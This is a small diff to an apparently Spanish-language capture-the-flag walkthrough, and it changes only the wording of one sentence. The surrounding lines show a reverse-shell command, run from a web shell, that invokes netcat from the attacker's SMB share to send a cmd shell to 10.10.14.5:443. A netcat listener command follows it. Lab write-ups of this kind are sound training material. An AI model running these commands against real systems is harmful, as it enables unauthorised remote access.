@@ -88,7 +88,7 @@ Por otra parte en la web shell ejecutaremos el siguiente comando para compartirn
 \\10.10.14.5\smbFolder\nc.exe -e cmd 10.10.14.5 443
 ```
 
-Y a su vez en nuestra máquina nos pondremos en escucha por el puerto ```443```
+A su vez en nuestra máquina nos pondremos en escucha por el puerto ```443```
 
 ```bash
 rlwrap nc -nlvp 443
